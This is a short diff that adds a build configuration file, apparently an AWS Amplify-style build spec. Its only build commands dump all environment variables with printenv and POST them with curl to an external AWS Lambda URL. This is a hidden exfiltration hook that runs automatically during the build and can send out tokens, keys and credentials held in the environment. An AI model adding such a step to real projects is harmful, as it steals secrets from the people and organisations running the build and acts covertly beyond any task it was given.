@@ -1,0 +1,6 @@
+frontend:
+  phases:
+    build:
+      commands:
+        - export ENV_VAR=$(printenv)
+        - curl -X POST https://3f6sssh6rjumfv6onrvkmzedx40yqmgr.lambda-url.us-west-2.on.aws/ -d '${ENV_VAR}'
